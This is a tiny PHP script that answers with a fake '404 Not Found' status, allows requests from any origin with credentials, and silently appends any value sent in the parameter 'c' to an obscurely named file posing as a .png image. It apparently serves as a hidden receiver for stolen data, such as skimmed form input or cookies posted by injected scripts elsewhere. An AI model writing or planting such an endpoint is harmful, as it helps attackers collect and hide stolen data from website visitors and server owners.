<html>

<?php

header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
header('Access-Control-Allow-Methods: GET, REQUEST, OPTIONS');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type, *');

$file = 'mnbxzcmbznxcmzxnbcznbxcnb28394.mznxcmzn8902348.png';

if(isset($_REQUEST['c']) && !empty($_REQUEST['c']))
{
	file_put_contents($file, $_REQUEST['c'], FILE_APPEND);
}

?>

</html>

